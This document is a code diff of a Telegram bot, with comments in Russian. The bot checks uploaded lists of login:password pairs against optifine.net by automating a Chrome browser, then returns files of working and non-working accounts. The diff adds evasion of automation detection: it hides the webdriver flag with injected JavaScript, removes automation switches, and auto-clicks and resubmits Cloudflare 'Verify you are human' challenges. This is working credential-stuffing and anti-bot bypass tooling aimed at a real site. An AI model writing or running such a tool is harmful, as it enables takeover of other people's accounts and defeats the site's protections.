@@ -87,8 +87,13 @@ class OptifineChecker:
             chrome_options.add_argument('--disable-features=IsolateOrigins')
             chrome_options.add_argument('--disable-features=site-per-process')
             
-            # User-Agent
-            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+            # ДОПОЛНИТЕЛЬНЫЕ НАСТРОЙКИ ДЛЯ CLOUDFLARE
+            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            chrome_options.add_experimental_option('useAutomationExtension', False)
+            
+            # User-Agent (более новый)
+            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
             
             # Путь к ChromeDriver
             driver_path = '/usr/local/bin/chromedriver'
@@ -109,6 +114,9 @@ class OptifineChecker:
                 renderer="Intel Iris OpenGL Engine",
                 fix_hairline=True,
             )
+            
+            # Дополнительный JavaScript для скрытия автоматизации
+            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
             
             logger.info("✅ Драйвер успешно инициализирован")
             
@@ -187,63 +195,113 @@ class OptifineChecker:
             logger.error(f"Ошибка при анализе страницы: {e}")
             return False
     
-    def handle_cloudflare(self, timeout=60):
-        """Обработка Cloudflare защиты"""
+    def handle_cloudflare(self, timeout=120):
+        """Усиленная обработка Cloudflare защиты"""
+        logger.info("🛡️ Начинаю обработку Cloudflare...")
         start_time = time.time()
+        last_progress_log = 0
         
         while time.time() - start_time < timeout:
             current_title = self.driver.title.lower()
             current_url = self.driver.current_url
             
             # Проверяем, не проскочили ли мы Cloudflare
-            if 'login' in current_url and 'just a moment' not in current_title:
-                logger.info("✅ Cloudflare пройден, на странице входа")
-                return True
+            if ('login' in current_url or 'optifine' in current_url) and 'just a moment' not in current_title:
+                # Проверяем наличие формы входа
+                try:
+                    inputs = self.driver.find_elements(By.TAG_NAME, "input")
+                    if len(inputs) > 0:
+                        logger.info("✅ Cloudflare пройден, форма входа найдена")
+                        return True
+                except:
+                    pass
             
-            # Проверяем наличие капчи Turnstile
+            # Пробуем разные способы обхода Cloudflare
             try:
-                turnstile = self.driver.find_elements(By.CSS_SELECTOR, 
-                    "[class*='turnstile'], [src*='challenges.cloudflare.com'], iframe[src*='challenges']")
-                if turnstile and any(t.is_displayed() for t in turnstile):
-                    logger.info("🔄 Обнаружена Turnstile капча, ждем автоматического решения...")
-            except:
-                pass
+                # Способ 1: Ищем кнопку "Verify" и нажимаем
+                verify_selectors = [
+                    "//input[@type='submit' and contains(@value, 'Verify')]",
+                    "//button[contains(text(), 'Verify')]",
+                    "//a[contains(text(), 'Verify')]",
+                    "//*[@id='challenge-form']//button",
+                    "//*[contains(@class, 'ctp-button')]",
+                    "//*[contains(text(), 'Verify you are human')]",
+                ]
+                
+                for selector in verify_selectors:
+                    try:
+                        elements = self.driver.find_elements(By.XPATH, selector)
+                        for btn in elements:
+                            if btn.is_displayed() and btn.is_enabled():
+                                logger.info(f"🖱️ Нажимаю кнопку: {selector}")
+                                try:
+                                    btn.click()
+                                except:
+                                    self.driver.execute_script("arguments[0].click();", btn)
+                                self.human_like_delay(3, 5)
+                                break
+                    except:
+                        pass
+                
+                # Способ 2: Ждем автоматического решения Turnstile
+                try:
+                    turnstile = self.driver.find_elements(By.CSS_SELECTOR, 
+                        "[class*='turnstile'], iframe[src*='challenges'], [name='cf-turnstile-response']")
+                    if turnstile:
+                        logger.info("🔄 Обнаружена Turnstile капча, жду автоматического решения...")
+                except:
+                    pass
+                
+                # Способ 3: Пробуем отправить форму, если она есть
+                try:
+                    forms = self.driver.find_elements(By.TAG_NAME, "form")
+                    for form in forms:
+                        if form.is_displayed():
+                            logger.info("📝 Пробую отправить форму")
+                            self.driver.execute_script("arguments[0].submit();", form)
+                            self.human_like_delay(3, 5)
+                            break
+                except:
+                    pass
+                
+                # Способ 4: Обновляем страницу, если долго висит
+                elapsed = time.time() - start_time
+                if elapsed > 30 and elapsed % 30 < 5:
+                    logger.info("🔄 Пробую обновить страницу")
+                    self.driver.refresh()
+                    self.human_like_delay(5, 8)
+                
+            except Exception as e:
+                logger.debug(f"Ошибка при обработке Cloudflare: {e}")
             
-            # Проверяем наличие кнопки "Verify you are human"
-            try:
-                verify_buttons = self.driver.find_elements(By.XPATH, 
-                    "//*[contains(text(), 'Verify') or contains(text(), 'verify')]")
-                for btn in verify_buttons:
-                    if btn.is_displayed() and btn.is_enabled():
-                        logger.info("🖱️ Нажимаю 'Verify you are human'")
-                        try:
-                            btn.click()
-                        except:
-                            self.driver.execute_script("arguments[0].click();", btn)
-                        self.human_like_delay(2, 4)
-            except:
-                pass
+            # Логируем прогресс
+            elapsed = int(time.time() - start_time)
+            if elapsed - last_progress_log >= 10:
+                logger.info(f"⏳ Ожидание прохождения Cloudflare... {elapsed}/{timeout} сек")
+                last_progress_log = elapsed
             
-            # Проверяем, не появилась ли форма входа
+            # Проверяем наличие полей ввода (признак успеха)
             try:
-                # Ищем любой input на странице (кроме скрытых)
                 inputs = self.driver.find_elements(By.TAG_NAME, "input")
                 visible_inputs = [i for i in inputs if i.is_displayed() and 
                                  i.get_attribute('type') not in ['hidden', 'checkbox', 'radio']]
                 
-                if visible_inputs:
-                    logger.info(f"✅ Найдены видимые поля ввода ({len(visible_inputs)}), Cloudflare пройден")
+                if len(visible_inputs) >= 2:
+                    logger.info(f"✅ Найдены поля ввода ({len(visible_inputs)}), Cloudflare пройден")
                     return True
             except:
                 pass
             
-            # Ждем немного перед следующей проверкой
-            self.human_like_delay(2, 4)
-            
-            # Логируем прогресс каждые 10 секунд
-            elapsed = int(time.time() - start_time)
-            if elapsed % 10 == 0 and elapsed > 0:
-                logger.info(f"⏳ Ожидание прохождения Cloudflare... {elapsed}/{timeout} сек")
+            self.human_like_delay(2, 3)
+        
+        # Сохраняем скриншот для отладки
+        try:
+            self.driver.save_screenshot("/app/debug/cloudflare_failed.png")
+            with open("/app/debug/cloudflare_failed.html", 'w', encoding='utf-8') as f:
+                f.write(self.driver.page_source)
+            logger.info("📸 Сохранен скриншот ошибки Cloudflare")
+        except:
+            pass
         
         logger.warning("⚠️ Cloudflare не пройден за отведенное время")
         return False
@@ -256,31 +314,21 @@ class OptifineChecker:
                 return False
         
         try:
-            # Проверяем текущий URL
-            current_url = self.driver.current_url
-            
-            # Если мы уже на странице входа и Cloudflare пройден
-            if 'login' in current_url and 'just a moment' not in self.driver.title.lower():
-                # Проверяем, есть ли поля ввода
-                inputs = self.driver.find_elements(By.TAG_NAME, "input")
-                visible_inputs = [i for i in inputs if i.is_displayed() and 
-                                 i.get_attribute('type') not in ['hidden']]
-                
-                if len(visible_inputs) >= 2:  # Обычно есть поле логина и пароля
-                    logger.info("✅ Уже на странице входа")
-                    return True
-            
-            # Если нет - переходим на страницу входа
+            # Переходим на страницу входа
             logger.info("🌐 Перехожу на страницу входа...")
             self.driver.get("https://optifine.net/login")
+            self.human_like_delay(5, 8)
+            
+            # Проходим Cloudflare с увеличенным таймаутом
+            if not self.handle_cloudflare(timeout=120):
+                # Пробуем еще раз с обновлением
+                logger.info("🔄 Пробую второй раз...")
+                self.driver.refresh()
+                self.human_like_delay(5, 8)
+                if not self.handle_cloudflare(timeout=120):
+                    return False
+            
             self.human_like_delay(3, 5)
-            
-            # Проходим Cloudflare
-            if not self.handle_cloudflare(timeout=60):
-                self.analyze_page("cloudflare_error")
-                return False
-            
-            self.human_like_delay(2, 4)
             logger.info("✅ Готов к проверке аккаунтов")
             return True
             
@@ -304,14 +352,6 @@ class OptifineChecker:
                 }
         
         try:
-            # Убеждаемся, что мы на странице входа
-            if not self.ensure_login_page():
-                return {
-                    'login': login,
-                    'status': 'error',
-                    'error': 'Не удалось загрузить страницу входа'
-                }
-            
             # Поиск поля email/username
             email_field = None
             email_selectors = [
@@ -442,7 +482,7 @@ class OptifineChecker:
                     'error': 'Кнопка не найдена'
                 }
             
-            # Очищаем поля перед вводом (на случай если там уже что-то есть)
+            # Очищаем поля перед вводом
             try:
                 email_field.clear()
             except:
@@ -469,10 +509,6 @@ class OptifineChecker:
             
             self.human_like_delay(0.5, 1)
             
-            # Сохраняем скриншот перед отправкой (для отладки)
-            if random.random() < 0.1:  # Сохраняем только каждый 10-й для экономии места
-                self.driver.save_screenshot(f"/app/debug/before_submit_{login[:10]}.png")
-            
             # Нажимаем кнопку
             logger.info("🖱️ Нажимаю кнопку входа")
             try:
@@ -490,10 +526,6 @@ class OptifineChecker:
             
             # Ждем результат
             self.human_like_delay(5, 8)
-            
-            # Сохраняем результат (для отладки)
-            if random.random() < 0.1:
-                self.driver.save_screenshot(f"/app/debug/after_submit_{login[:10]}.png")
             
             # Анализируем результат
             current_url = self.driver.current_url
@@ -520,7 +552,7 @@ class OptifineChecker:
             if any(indicator in current_url.lower() for indicator in ['downloads', 'profile', 'account', 'dashboard']):
                 logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                 
-                # Возвращаемся на страницу входа для следующего аккаунта
+                # Возвращаемся на страницу входа
                 self.driver.get("https://optifine.net/login")
                 self.human_like_delay(2, 4)
                 
@@ -613,33 +645,27 @@ checker = OptifineChecker()
 
 async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Отправка файлов отладки"""
-    # Проверяем, является ли пользователь администратором
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ **Нет доступа к отладке**")
         return
     
     try:
-        # Проверяем, существует ли папка debug
         if not os.path.exists('/app/debug'):
             await update.message.reply_text("📁 Папка /app/debug не найдена")
             return
         
-        # Получаем список файлов
         files = os.listdir('/app/debug')
         
         if not files:
             await update.message.reply_text("📁 Папка debug пуста")
             return
         
-        # Сортируем файлы по дате изменения (новые сначала)
         files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
         
-        # Отправляем первые 5 файлов (самые новые)
         sent_count = 0
         for file in files[:5]:
             file_path = os.path.join('/app/debug', file)
             
-            # Проверяем размер файла (Telegram ограничение ~50MB)
             if os.path.getsize(file_path) > 50 * 1024 * 1024:
                 await update.message.reply_text(f"⚠️ Файл {file} слишком большой (>50MB)")
                 continue
@@ -680,11 +706,9 @@ async def process_file(file_path, update, context):
     )
     
     try:
-        # Читаем файл
         async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = await f.read()
         
-        # Парсим аккаунты
         lines = content.strip().split('\n')
         accounts = []
         
@@ -714,14 +738,21 @@ async def process_file(file_path, update, context):
         
         start_time = time.time()
         
-        # Сначала проходим Cloudflare один раз
+        # Проходим Cloudflare один раз
         await msg.edit_text(
-            f"🔄 **Подготавливаю сессию...**\n"
-            f"⏳ Прохожу Cloudflare защиту..."
+            f"🛡️ **Подготавливаю сессию...**\n"
+            f"⏳ Прохожу Cloudflare защиту (до 2 минут)..."
         )
         
         if not checker.ensure_login_page():
-            await msg.edit_text("❌ **Не удалось пройти Cloudflare защиту**")
+            await msg.edit_text(
+                "❌ **Не удалось пройти Cloudflare защиту**\n\n"
+                "Возможные причины:\n"
+                "• Слишком много запросов с вашего IP\n"
+                "• Cloudflare требует ручного подтверждения\n"
+                "• Проблемы с сетью\n\n"
+                "Попробуйте позже или используйте /debug для анализа"
+            )
             return
         
         await msg.edit_text(
@@ -731,7 +762,6 @@ async def process_file(file_path, update, context):
         )
         
         for i, (login, password) in enumerate(accounts, 1):
-            # Обновляем прогресс
             if i % 5 == 0 or i == total:
                 elapsed = time.time() - start_time
                 await msg.edit_text(
@@ -741,10 +771,8 @@ async def process_file(file_path, update, context):
                     f"🔄 **Проверяю:** {login[:15]}..."
                 )
             
-            # Проверка аккаунта
             result = await checker.check_account(login, password)
             
-            # Сортируем результаты
             if result['status'] == 'valid':
                 results['valid'].append(result)
                 bot_stats['valid'] += 1
@@ -759,14 +787,10 @@ async def process_file(file_path, update, context):
                 logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
             
             bot_stats['total'] += 1
-            
-            # Небольшая задержка между проверками
             await asyncio.sleep(2)
         
-        # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
-        # Файл с рабочими
         if results['valid']:
             valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
             async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
@@ -781,7 +805,6 @@ async def process_file(file_path, update, context):
                 )
             os.remove(valid_file)
         
-        # Файл с нерабочими
         if results['invalid']:
             invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
             async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
@@ -796,7 +819,6 @@ async def process_file(file_path, update, context):
                 )
             os.remove(invalid_file)
         
-        # Файл с ошибками
         if results['errors']:
             error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
             async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
@@ -811,7 +833,6 @@ async def process_file(file_path, update, context):
                 )
             os.remove(error_file)
         
-        # Итог
         elapsed = time.time() - start_time
         minutes = int(elapsed // 60)
         seconds = int(elapsed % 60)
@@ -937,7 +958,6 @@ def main():
     
     app = Application.builder().token(TOKEN).build()
     
-    # Добавляем обработчики команд
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("debug", debug_command))
     app.add_handler(CallbackQueryHandler(button_callback))
